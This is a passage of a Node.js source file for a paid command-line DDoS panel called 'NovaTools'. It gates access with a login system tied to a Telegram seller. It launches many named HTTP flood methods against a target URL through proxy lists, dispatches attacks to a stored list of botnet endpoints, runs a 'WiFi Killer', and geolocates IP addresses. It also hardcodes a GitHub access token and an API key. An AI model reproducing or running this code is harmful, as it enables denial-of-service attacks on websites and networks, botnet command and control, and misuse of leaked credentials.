#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const dns = require('dns');
const { Octokit } = require("@octokit/rest");
const https = require('https')
const crypto = require('crypto');
const { promisify } = require('util')
const Table = require('cli-table3')
const fetch = require('node-fetch')
const whois = require('whois-json')
const fs = require('fs');
const url = require('url')
const axios = require('axios')
const path = require('path')
const loginFile = './lib/loginStatus.json';
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m';
const ungu = '\x1b[35m';
const duhle = '\x1b[38;2;0;0;128m';
const hijau = '\x1b[38;2;144;238;144m'
const { saveLoginStatus } = require('./auth');
const { sendLoginRequest } = require('./telegramBot');
const pendingLoginFile = './lib/pendingLoginRequests.json';
let processList = [];

const nova = readline.createInterface({
  input: process.stdin,
  output: process.stdout,
})
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

// [=====]//
function ensureLoginFileExists() {
  if (!fs.existsSync("./lib")) {
    fs.mkdirSync("./lib");
  }
  if (!fs.existsSync(loginFile)) {
    fs.writeFileSync(loginFile, JSON.stringify({ isLoggedIn: false, username: null, role: null }));
  }
}

function isUserLoggedIn() {
  ensureLoginFileExists();
  try {
    const encryptedData = fs.readFileSync(loginFile, 'utf-8');
    const decryptedData = decrypt(encryptedData);
    if (!decryptedData) return false;

    const parsedData = JSON.parse(decryptedData);
    const currentDate = new Date();
    const expiredDate = new Date(parsedData.expiredDate);

    return currentDate <= expiredDate && parsedData.isLoggedIn;
  } catch (error) {
    console.error("Error Reading Login File:", error.message);
    return false;
  }
}

const bannerText = `
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡔⠢⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⠀⠀⡏⡠⢄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣀⠜⠀⠀⠛⢻⠀⢰⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢘⢫⠖⠀⠀⠀⠸⠋⠀⠆⠀⠀⠀
⠀⠀⠀⠀⢀⡔⢸⣯⠀⠀⠀⠀⣄⣴⣿⡄⠀⠀⠀
⠀⠀⠀⠀⡼⠀⣤⢛⢦⠀⠆⠀⠿⠉⠀⡆⠀⠀⠀
⠀⠀⣀⠼⢥⣾⠎⠀⠘⣷⠏⠀⠀⠀⠀⠸⡀⠀⠀
⠈⠙⠻⣶⠾⡷⠇⠀⠀⠘⠀⠀⠀⠄⠀⠀⣱⡀⠀
⠀⠀⡰⣻⡑⠀⠟⡇⠄⢀⠀⠐⣄⢸⡀⣾⣿⡇⠀
⠀⠀⢰⣿⣷⠆⠀⠘⢮⢮⣦⣀⠟⠃⠙⢿⡙⢆⠀
⠀⠀⠈⣏⣏⠀⠀⠀⠀⠀⠉⠙⠆⠀⠀⠀⠋⢷⡄
⠀⠀⠀⠀⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀
`

function checkLoginApproval(username) {
  if (fs.existsSync(pendingLoginFile)) {
    const pendingRequests = JSON.parse(fs.readFileSync(pendingLoginFile, 'utf-8'));
    console.log('Pending Requests:', pendingRequests);
    if (pendingRequests[username] && pendingRequests[username].status === 'approved') {
      return true;
    }
  }
  return false;
}

// FUNGSI UTAMA ( JAN DIRUBAH LOHYA😹 )
async function login() {
  console.log(`\x1b[31m${bannerText}\x1b[0m`);
  await sleep(500);
  console.log(" \x1b[1m\x1b[31mInput The Username And Password\x1b[0m\nDon't Have One? Buy At t.me/saaeaf");
  await sleep(800);
  const userPassData = await fetch("https://raw.githubusercontent.com/SaaXPloitz/userpass/refs/heads/main/userpass.json");
  const userPass = await userPassData.json();
  return new Promise((resolve) => {
    nova.question(`\x1b[31mUsername\x1b[0m: `, async (inputUser) => {
      nova.question(`\x1b[31mPassword\x1b[0m: `, async (inputPass) => {
        console.log("\n\x1b[38;2;128;128;128mChecking Your Account, Please Waiting");
        await sleep(1500);
        if (userPass[inputUser] && userPass[inputUser].password === inputPass.trim()) {
          const expiredDate = new Date(userPass[inputUser].expired);
          const currentDate = new Date();
          if (currentDate > expiredDate) {
            console.log(`\n\x1b[31mYour Account Has Expired. Please Contact The Administrator.`);
            process.exit(-1);
          }
          await sleep(1000);
          if (userPass[inputUser].role === 'Admin') {
            saveLoginStatus(inputUser, expiredDate, userPass[inputUser].role);
            await sleep(1200);
            console.log(`\n\x1b[32mSuccessfully Logged In As Admin.\x1b[0m.`);
            resolve(true);
          } else {
            sendLoginRequest(inputUser, expiredDate, userPass[inputUser].role);
            console.log(`\n\x1b[38;2;128;128;128mLogin Request Sent. Waiting For Admin Approval.\x1b[0m`);
            resolve(false); 
          }
        } else {
          console.log(`\n\x1b[31mSorry, Not Found Your Account.`);
          process.exit(-1);
        }
      });
    });
  });
}
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// fungsi banner
async function banner() {
  console.clear(); // bersihkan layar sebelum menampilkan banner
  const currentDate = new Date();
  const formattedDate = currentDate.toLocaleDateString('id-ID', {
      month: 'short',
      day: '2-digit',
      year: 'numeric',
  });
  
try {
    const encryptedData = fs.readFileSync(loginFile, 'utf-8');
    const decryptedData = decrypt(encryptedData);
    if (!decryptedData) {
      console.log("\x1b[31mError: Failed To Decrypt Login Data.\x1b[0m");
      return;
    }

    const data = JSON.parse(decryptedData);
    
  const bannerText = `\n
    \x1b[38;2;255;0;0m _  ______ _   _____     ___  ___  ____     _________________\x1b[0m
   \x1b[38;2;223;32;32m / |/ / __ \\ | / / _ |   / _ \\/ _ \\/ __ \\__ / / __/ ___/_  __/\x1b[0m
   \x1b[38;2;191;64;64m/    / /_/ / |/ / __ |  / ___/ , _/ /_/ / // / _// /__  / /\x1b[0m 
  \x1b[38;2;128;128;128m/_/|_/\\____/|___/_/ |_| /_/  /_/|_|\\____/\\___/___/\\___/ /_/\x1b[0m
                  🔥  Welcome To \x1b[48;5;7m\x1b[38;2;128;128;128mNovaTools\x1b[0m  🔥\n
  | Login as : ${data.username} | Vip: True
  | Expired: ${data.expiredDate}
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
  `;
    await scrapeProxy()
    await scrapeUserAgent()
    console.log(bannerText);
  } catch (error) {
    console.error("\x1b[31mError Displaying Banner:", error.message, "\x1b[0m");
  }
}

async function bootup() {
  try {
    if (isUserLoggedIn()) {
      const encryptedData = fs.readFileSync(loginFile, 'utf-8');
      const decryptedData = decrypt(encryptedData);
      if (!decryptedData) {
        console.log("\x1b[31mError: Failed To Decrypt Login Data.\x1b[0m");
        return;
      }

      const data = JSON.parse(decryptedData);

      if (!data.username) {
        console.log("\x1b[31mError: Username Is Undefined.\x1b[0m");
        return;
      }

      console.log(`\n\x1b[1mHi ${data.username}!, You Are Already Logged In.\n`);
      await sleep(2500);
      console.clear();
      await banner();
      sigma();
      return;
    }
    
    const loginSuccessful = await login();
    if (!loginSuccessful) {
      return;
    }

    await banner();
    sigma();
  } catch (error) {
    console.log('Error occurred :', error.message);
    console.log(' Error! ');
  }
}
// [========================================] //
const SECRET_KEY = crypto.createHash('sha256').update(String(process.env.SECRET_KEY || 'xA9vP+eL5r3zT8nK1YqB72WfRtXoU0Mb')).digest('base64').substr(0, 32);

function encrypt(text) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(SECRET_KEY, 'utf8'), iv);
  let encrypted = cipher.update(text, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return JSON.stringify({ iv: iv.toString('base64'), encryptedData: encrypted });
}

function decrypt(encryptedObject) {
  try {
    const parsedObject = JSON.parse(encryptedObject);
    const iv = Buffer.from(parsedObject.iv, 'base64');
    const encryptedText = Buffer.from(parsedObject.encryptedData, 'base64');
    const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(SECRET_KEY, 'utf8'), iv);
    let decrypted = decipher.update(encryptedText, 'base64', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
  } catch (error) {
    console.error("Decryption Error:", error.message);
    return null;
  }
}
// ========== //
async function killWifi() {
const wifiPath = path.join(__dirname, `/lib/cache/StarsXWiFi`);
const startKillwiFi = spawn('node', [wifiPath]);
console.log(`
WiFi Killer Has Started
Type exit To Stop
`);
nova.question(`${back_putih}${teksmerah}SaaX DoS${Reset}➔ ${back_putih}${teksmerah}WiFi Killer${Reset}: \n`, async (yakin) => {
if (yakin === 'exit') {
  startKillwiFi.kill('SIGKILL')
  console.log(`WiFi Killer Has Ended`)
  sigma()
} else {
  console.log(`do you mean 'exit'?`)
  sigma()
}})
}
// [========================================] //

async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: srvattack [URL] [DURATION] [METHODS]
srvattack https://google.com 120 flood`);
        sigma();
        return;
    }
const [target, duration, methods] = args;
    
const roleHierarchy = ['Admin', 'SuperVIP', 'VIP'];

  function checkRole(requiredRole) {
    const data = JSON.parse(fs.readFileSync(loginFile, 'utf-8'));
    const userRole = data.role;
    const userRoleIndex = roleHierarchy.indexOf(userRole);
    const requiredRoleIndex = roleHierarchy.indexOf(requiredRole);
    return userRoleIndex <= requiredRoleIndex;
  }

  let requiredRole;
  if (methods === 'flood') {
    requiredRole = 'SuperVIP';
  } else if (methods === 'tls') {
    requiredRole = 'VIP';
  } else {
    console.log(`${Bold}Method ${methods} Not Recognized`);
    sigma();
    return;
  }

  if (!checkRole(requiredRole)) {
    console.log(`\n${Bold}\x1b[31mYou Need ${requiredRole} Role To Use The ${methods} Methods.\x1b[0m\n`);
    sigma();
    return;
  }

    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;

        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        const currentDate = new Date();
        const formattedDate = currentDate.toLocaleDateString('id-ID', {
            month: 'short',
            day: '2-digit',
            year: 'numeric',
        });
        
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
        console.clear();
        const attackLog = `
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀\x1b[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁⠸⢳⡄\x1b[0m⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⢸⠸⠀⡠⣄\x1b[0m⠀⠀⠀⠀
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠃⠀⠀⢠⣞⣀⡿⠀⠀⣧\x1b[0m⠀⠀⠀⠀
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⡖⠁⠀⠀⠀⢸⠈⢈⡇⠀\x1b[0m⢀⡏⠀⠀⠀-⠀\x1b[92mAttack Sent Successfully All Server\x1b[0m -
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⠀⠀⠀⠀⡴⠩⢠⡴⠀⠀⠀⠀⠀⠈⡶⠉\x1b[0m⠀⠀⡸⠀⠀⠀  ⠀⠀
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⠀⠀⢀⠎⢠⣇⠏⠀⠀⠀⠀⠀⠀⠀\x1b[0m⠁⠀⢀⠄⡇⠀⠀⠀⠀⠀
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⠀⢠⠏⠀⢸⣿⣴⠀⠀⠀⠀⠀⠀⣆⣀\x1b[0m⢾⢟⠴⡇⠀⠀⠀⠀⠀
\x1b[1m\x1b[91m⠀⠀⠀⠀⠀⢀⣿⠀⠠⣄⠸⢹⣦⠀⠀⡄⠀⠀⢋\x1b[0m⡟⠀⠀⠁⣇⠀⠀⠀⠀⠀${back_putih}\x1b[36mAttack Details\x1b[0m
\x1b[1m\x1b[91m⠀⠀⠀⠀⢀⡾⠁⢠⠀⣿⠃⠘⢹⣦⢠⣼\x1b[0m⠀⠀⠉⠀⠀⠀⠀⢸⡀⠀⠀⠀⠀ Host:  [ \x1b[94m${target} \x1b[0m]
\x1b[1m\x1b[91m⠀⠀⢀⣴⠫⠤⣶⣿⢀⡏⠀⠀⠘⢸⡟⠋\x1b[0m⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠀⠀ Port:  [ \x1b[94m443 \x1b[0m]
\x1b[1m\x1b[91m⠐⠿⢿⣿⣤⣴⣿⣣⢾⡄⠀⠀⠀⠀⠳\x1b[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀ Time:  [ \x1b[94m${duration} \x1b[0m]
\x1b[1m\x1b[91m⠀⠀⠀⣨⣟⡍⠉⠚⠹⣇⡄⠀⠀⠀\x1b[0m⠀⠀⠀⠀⠀⠈⢦⠀⠀⢀⡀⣾⡇⠀⠀${back_putih}\x1b[36mTarget Details\x1b[0m
\x1b[1m\x1b[91m⠀⠀⢠⠟⣹⣧⠃⠀⠀⢿⢻\x1b[0m⡀⢄⠀⠀⠀⠀⠐⣦⡀⣸⣆⠀⣾⣧⣯⢻⠀⠀ ASN:  [ \x1b[94m${result.as} \x1b[0m]
\x1b[1m\x1b[91m⠀⠀⠘⣰⣿⣿⡄⠀⠀⠀⠳\x1b[0m⣼⢦⡘⣄⠀⠀⡟⡷⠃⠘⢶⣿⡎⠻⣆⠀   ISP:  [ \x1b[94m${result.isp} \x1b[0m]
\x1b[1m\x1b[91m⠀⠀⠀⡟⡿⢿⡿\x1b[0m⠀⠀⠀⠀⠀⠙⠀⠻⢯⢷⣼⠁⠁⠀⠀⠀⠙⢿⡄⡈⢆⠀ ORG:  [ \x1b[94m${result.org} \x1b[0m]
\x1b[1m\x1b[91m⠀⠀⠀⠀⡇⣿⡅\x1b[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠦⠀⠀⠀⠀⠀⠀⡇⢹⢿⡀ Methods:  [ \x1b[94m${methods} \x1b[0m]
\x1b[1m\x1b[91m⠀⠀⠀⠀⠁⠛⠓\x1b[0m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠼⠇⠁
    Please type \x1b[92mCLS\x1b[0m after attack
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m`;
//TIRU AJA BANG, SEMOGA CEPET KETEMU AJALL😹
        await printWithDelay(attackLog, 26);

    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
    }
    sigma();
}

async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
            sigma();
            return          
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

// ========= //
async function addUser(username, password, expired, role) {
  try {
    const octokit = new Octokit({
      auth: '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',
    });

    const owner = 'SaaXPloitz';
    const repo = 'userpass';
    const path = 'userpass.json';

    const { data: fileData } = await octokit.repos.getContent({
      owner,
      repo,
      path,
    });

    const content = Buffer.from(fileData.content, 'base64').toString('utf-8');
    const userPass = JSON.parse(content);

    userPass[username] = {
      password: password,
      expired: expired,
      role: role,
    };

    await octokit.repos.createOrUpdateFileContents({
      owner,
      repo,
      path,
      message: `Add User ${username}`,
      content: Buffer.from(JSON.stringify(userPass, null, 2)).toString('base64'),
      sha: fileData.sha,
    });

    console.log(`\x1b[32mUser ${username} Successfully Added.\x1b[0m`);
  } catch (error) {
    console.error(`\x1b[31mError Adding User: ${error.message}\x1b[0m`);
  }
}
// [========================================] //
async function removeUser(username) {
  try {
    const octokit = new Octokit({
      auth: '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',
    });

    const owner = 'SaaXPloitz';
    const repo = 'userpass';
    const path = 'userpass.json';

    const { data: fileData } = await octokit.repos.getContent({
      owner,
      repo,
      path,
    });

    const content = Buffer.from(fileData.content, 'base64').toString('utf-8');
    const userPass = JSON.parse(content);

    if (!userPass[username]) {
      console.log(`\x1b[31mUser ${username} Not Found.\x1b[0m`);
      return;
    }

    delete userPass[username]

    await octokit.repos.createOrUpdateFileContents({
      owner,
      repo,
      path,
      message: `Remove User ${username}`,
      content: Buffer.from(JSON.stringify(userPass, null, 2)).toString('base64'),
      sha: fileData.sha,
    });

    console.log(`\x1b[32mUser ${username} Successfully Removed.\x1b[0m`);
  } catch (error) {
    console.error(`\x1b[31mError Removing User: ${error.message}\x1b[0m`);
  }
}
// ======= //
async function getIPAddress(target) {
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

        if (response.data && response.data.status === "success") {
            return response.data.query;
        } else {
            return target;
        }
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return target;
    }
}

async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\nRunning Attack\n";
    attackDetails += `   # │        HOST          │ SINCE │ DURATION │ METHOD  \n`;
    attackDetails += `─────┼──────────────────────┼───────┼──────────┼──────────\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += ` ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} \n`;
    });

    // Garis bawah tabel

    console.log(attackDetails);
    sigma();
}

async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving server data:', error.message);
        sigma()
    }

   
    console.log(`Checked server. ${successCount} server online.`);
    sigma()
}


async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.clear()
    console.log(`
  \x1b[31m╔╗╔╔═╗╦  ╦╔═╗  ╔═╗╦═╗╔═╗\x1b[0m ╦╔═╗╔═╗╔╦╗
  \x1b[31m║║║║ ║╚╗╔╝╠═╣  ╠═╝╠╦╝\x1b[0m║ ║ ║║╣ ║   ║ 
  \x1b[31m╝╚╝╚═╝ ╚╝ ╩ ╩  ╩\x1b[0m  ╩╚═╚═╝╚╝╚═╝╚═╝ ╩  
                     Tracking IP Address Result 
                     Type ${bold}${biru}"cls"${Reset} to clear terminal
\x1b[38;5;255m──\x1b[38;5;254m──\x1b[38;5;253m──\x1b[38;5;252m──\x1b[38;5;251m──\x1b[38;5;250m──\x1b[38;5;249m──\x1b[38;5;248m──\x1b[38;5;247m──\x1b[38;5;246m──\x1b[38;5;245m──\x1b[38;5;244m──\x1b[38;5;243m──\x1b[38;5;242m──\x1b[38;5;240m──\x1b[38;5;238m──\x1b[38;5;235m──\x1b[38;5;232m──\x1b[38;5;238m──\x1b[38;5;240m──\x1b[38;5;242m──\x1b[38;5;243m──\x1b[38;5;244m──\x1b[38;5;245m──\x1b[38;5;246m──\x1b[38;5;247m──\x1b[38;5;248m──\x1b[38;5;249m──\x1b[38;5;250m──\x1b[38;5;251m──\x1b[38;5;252m──\x1b[38;5;253m──\x1b[38;5;254m──\x1b[38;5;255m\x1b[0m
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("  Ongoing Attack:\n");
  processList.forEach((process) => {
console.log(`
\x1b[1mTarge\x1b[0mt: ${process.target}
\x1b[1mMethods\x1b[0m: ${process.methods}
\x1b[1mDuration\x1b[0m: ${process.duration} Seconds
\x1b[1mSince\x1b[0m: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: attack [URL] [DURATION] [METHODS]
attack https://google.com 120 flood`);
    sigma();
    return;
  }

  const [target, duration, methods] = args;
  try {
    const parsing = new URL(target); // url.URL -> URL (koreksi kecil)
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as,country,org`);
    const result = scrape.data;

    // Getting the current date and time .
    const now = new Date();
const options = { month: 'short', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric' , timeZone: 'Asia/Karachi' };
const formattedDate = now.toLocaleString('en-US', options);
    
    console.log(`
     - Attack Details -
 Status    :  \x1b[91m(\x1b[0m Attack Sent Successfully All Server \x1b[91m)\x1b[0m
 Target    :  \x1b[91m(\x1b[0m ${target} \x1b[91m)\x1b[0m
 Duration  :  \x1b[91m(\x1b[0m ${duration} \x1b[91m)\x1b[0m
 Method    :  \x1b[91m(\x1b[0m ${methods} \x1b[91m)\x1b[0m
 Sent On   :  \x1b[91m(\x1b[0m ${formattedDate} \x1b[91m)\x1b[0m
     - Target Details -
 ASN       :  \x1b[91m(\x1b[0m ${result.as} \x1b[91m)\x1b[0m
 ISP       :  \x1b[91m(\x1b[0m ${result.isp} \x1b[91m)\x1b[0m
 Country   :  \x1b[91m(\x1b[0m ${result.country} \x1b[91m)\x1b[0m
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 100 proxy.txt`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 10 90 proxy.txt --full`)
      sigma()
      } else if (methods === 'kill') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10`)
        sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
        } else if (methods === 'httpv2') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'yxz') {
       pushOngoing(target, methods, duration);
        exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`);
          sigma()
          } else if (methods === 'tlsvip') {
       pushOngoing(target, methods, duration);
        exec(`node ${metode} ${target} ${duration} 64 10 proxy.txt`);
          sigma()
          } else if (methods === 'thunder') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'http') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'http-x') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'http-exploit') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'httpv2') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'cat') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'xyn') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'rape') {
       pushOngoing(target, methods, duration)
